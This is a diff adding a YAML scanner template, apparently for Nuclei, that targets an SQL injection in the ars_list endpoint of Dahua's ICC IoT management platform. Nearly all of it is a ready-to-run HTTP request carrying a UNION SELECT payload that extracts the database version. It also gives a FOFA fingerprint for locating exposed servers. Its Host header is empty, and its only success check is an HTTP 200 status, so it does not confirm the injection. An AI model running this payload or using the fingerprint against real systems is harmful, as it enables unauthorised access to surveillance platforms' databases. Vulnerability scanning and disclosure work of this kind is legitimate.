@@ -1,0 +1,29 @@
+id: poc-rxs4246ifbx7zwc2
+info:
+  name: 大华ICC智能物联管理平台 ars_list 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rxs4246ifbx7zwc2'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rxs4246ifbx7zwc2
+    fofa: body="static/qwebchannel.js" && body="/*客户端会小于800*/"
+http:
+- raw:
+  - 'GET /evo-apigw/evo-arsm/1.0.0/ars/list?serviceName=''+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,VERSION(),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
+
+    Host
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
